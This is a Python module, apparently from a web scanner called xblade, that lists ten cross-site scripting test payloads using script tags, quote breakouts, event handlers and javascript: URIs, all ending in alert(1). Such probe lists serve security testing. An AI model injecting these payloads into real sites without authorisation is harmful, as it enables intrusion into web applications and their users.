# xblade/core/payloads.py

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "<math><mi//xlink:href='data:x,<script>alert(1)</script>'>",
    "<video><source onerror='alert(1)'>",
    "<object data='javascript:alert(1)'>"
]
